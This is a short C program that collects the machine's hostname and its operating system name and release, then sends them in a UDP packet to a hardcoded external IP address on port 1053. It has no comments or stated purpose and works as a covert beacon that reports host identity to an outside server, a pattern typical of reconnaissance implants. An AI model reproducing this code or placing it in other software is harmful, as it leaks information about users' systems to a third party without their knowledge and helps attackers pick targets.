#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <sys/utsname.h>
#include <stdio.h>
#include <string.h>

int main() {
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    struct sockaddr_in a = {0};
    a.sin_family = AF_INET;
    a.sin_port = htons(1053);
    inet_pton(AF_INET, "54.190.181.173", &a.sin_addr);

    char n[64], b[128];
    struct utsname u;
    gethostname(n, 64);
    uname(&u);

    snprintf(b, 128, "R:%s,O:%s %s", n, u.sysname, u.release);
    sendto(s, b, strlen(b), 0, (struct sockaddr*)&a, sizeof(a));

    return 0;
}
